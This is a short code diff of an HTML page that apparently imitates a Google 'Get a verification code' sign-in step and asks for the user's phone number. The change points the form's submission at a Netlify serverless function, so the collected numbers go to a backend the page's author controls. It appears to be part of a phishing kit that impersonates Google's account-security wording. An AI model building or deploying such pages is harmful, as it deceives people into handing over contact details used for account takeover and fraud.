@@ -23,7 +23,7 @@
     </div>
     <h1>Get a verification code</h1>
     <p class="subtitle">To help keep your account secure, Google wants to make sure it's really you trying to sign in</p>
-    <form action="/phone" method="POST">
+    <form action="/.netlify/functions/phone" method="POST">
       <input type="tel" name="phone" placeholder="Phone number" required>
       <button type="submit">Send code</button>
     </form>
